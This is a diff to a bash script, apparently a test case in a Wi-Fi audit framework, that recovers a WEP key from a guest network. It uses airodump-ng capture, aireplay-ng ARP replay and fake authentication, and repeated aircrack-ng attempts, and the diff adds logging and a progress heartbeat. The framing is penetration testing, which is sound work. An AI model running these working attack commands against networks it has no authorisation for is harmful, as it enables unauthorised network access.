@@ -41,6 +41,8 @@ EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
 ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
 TC_ID="D2"
 OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
+AIRODUMP_LOG="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
+AIREPLAY_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
 
 if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
     echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
@@ -55,16 +57,28 @@ if [[ -n "$CHANNEL" && "$CHANNEL" != "0" ]]; then
 fi
 
 # 1. Start airodump-ng to capture IVs
-airodump-ng --bssid "$BSSID" \
-    --channel "${CHANNEL:-0}" \
-    --write "$OUTPUT_BASE" \
-    --output-format pcap,csv \
-    "$INTERFACE" > /dev/null 2>&1 &
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    airodump-ng --bssid "$BSSID" \
+        --channel "${CHANNEL:-0}" \
+        --write "$OUTPUT_BASE" \
+        --output-format pcap,csv \
+        "$INTERFACE" 2>&1 | tee "$AIRODUMP_LOG" &
+else
+    airodump-ng --bssid "$BSSID" \
+        --channel "${CHANNEL:-0}" \
+        --write "$OUTPUT_BASE" \
+        --output-format pcap,csv \
+        "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
+fi
 AIRODUMP_PID=$!
 
 # 2. Start ARP Replay in background to flood IVs
 echo "[*] Launching ARP replay attack to generate IVs..."
-aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" 2>&1 | tee "$AIREPLAY_LOG" &
+else
+    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
+fi
 AIREPLAY_PID=$!
 
 # Cleanup function
@@ -82,26 +96,53 @@ SUCCESS=0
 
 echo "[*] Monitoring IV collection. Will attempt to crack every 30 seconds..."
 
+# Start dynamic telemetry heartbeat
+(
+    HEARTBEAT_ELAPSED=0
+    while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
+        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
+        [[ $PCT -gt 90 ]] && PCT=90
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
+        sleep 2
+        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
+    done
+) &
+TELEMETRY_PID=$!
+
 while [[ $ELAPSED -lt $SCAN_TIME ]]; do
     sleep 30
     ((ELAPSED+=30))
 
     if [[ -f "$CAP_FILE" ]]; then
         # Attempt to crack
-        if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1; then
-            if grep -q "KEY FOUND" "$KEY_FILE"; then
-                echo "[!] SUCCESS: WEP KEY RECOVERED IN ${ELAPSED}s!"
-                SUCCESS=1
-                break
+        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+            if aircrack-ng -b "$BSSID" "$CAP_FILE" 2>&1 | tee "$KEY_FILE"; then
+                if grep -q "KEY FOUND" "$KEY_FILE"; then
+                    echo "[!] SUCCESS: WEP KEY RECOVERED IN ${ELAPSED}s!"
+                    SUCCESS=1
+                    break
+                fi
+            fi
+        else
+            if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1; then
+                if grep -q "KEY FOUND" "$KEY_FILE"; then
+                    echo "[!] SUCCESS: WEP KEY RECOVERED IN ${ELAPSED}s!"
+                    SUCCESS=1
+                    break
+                fi
             fi
         fi
     fi
     
     # Send occasional fake authentication to keep the connection "warm"
-    aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 || true
+    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" 2>&1 | tee -a "$AIREPLAY_LOG" || true
+    else
+        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" >> "$AIREPLAY_LOG" 2>&1 || true
+    fi
 done
 
-"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Finalizing WEP audit..."
+kill "$TELEMETRY_PID" 2>/dev/null || true
 
 # 4. Reporting
 if [[ $SUCCESS -eq 1 ]]; then
@@ -127,5 +168,5 @@ else
         --rationale "WEP cracking depends on high traffic volume to generate IVs. If the network is idle, recovery may take significant time or fail."
 fi
 
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 exit 0
- 0
